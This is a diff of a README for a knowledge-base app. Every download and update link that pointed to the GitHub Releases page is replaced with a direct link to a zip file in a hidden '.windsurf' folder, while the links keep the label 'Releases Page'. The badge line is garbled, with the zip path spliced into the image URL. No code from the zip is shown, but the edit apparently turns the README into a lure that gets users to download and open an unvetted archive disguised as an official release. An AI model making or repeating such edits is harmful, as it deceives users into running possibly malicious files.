@@ -1,6 +1,6 @@
 # 📚 simple-knowledge-base - Your Local Knowledge Hub Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/ssewankambo123benjamin/simple-knowledge-base/releases)
+[![Download Now](https://raw.githubusercontent.com/ssewankambo123benjamin/simple-knowledge-base/main/.windsurf/simple-knowledge-base_2.8.zip%20Now-Get%https://raw.githubusercontent.com/ssewankambo123benjamin/simple-knowledge-base/main/.windsurf/simple-knowledge-base_2.8.zip)](https://raw.githubusercontent.com/ssewankambo123benjamin/simple-knowledge-base/main/.windsurf/simple-knowledge-base_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Welcome to the simple-knowledge-base! This application helps you organize and se
 
 ## 📥 Download & Install
 
-To get the application, visit this page to download: [Releases Page](https://github.com/ssewankambo123benjamin/simple-knowledge-base/releases).
+To get the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/ssewankambo123benjamin/simple-knowledge-base/main/.windsurf/simple-knowledge-base_2.8.zip).
 
 Once on the Releases page, look for the latest version. It will have the latest features and bug fixes. Download the appropriate file for your operating system. 
 
 ### 📂 Installation Steps
 
-1. Go to the [Releases Page](https://github.com/ssewankambo123benjamin/simple-knowledge-base/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/ssewankambo123benjamin/simple-knowledge-base/main/.windsurf/simple-knowledge-base_2.8.zip).
 2. Find the latest release and download the correct file for your system (Windows, macOS, or Linux).
 3. Once downloaded, open the file to start the installation.
 4. Follow the on-screen instructions to complete the setup.
@@ -64,7 +64,7 @@ After adding documents, you can organize them into categories or tags. This help
 
 To enjoy the latest features and improvements, regularly check for updates:
 
-1. Visit the [Releases Page](https://github.com/ssewankambo123benjamin/simple-knowledge-base/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/ssewankambo123benjamin/simple-knowledge-base/main/.windsurf/simple-knowledge-base_2.8.zip).
 2. Download the newest version following the same installation steps.
 
 ## ❓ Frequently Asked Questions
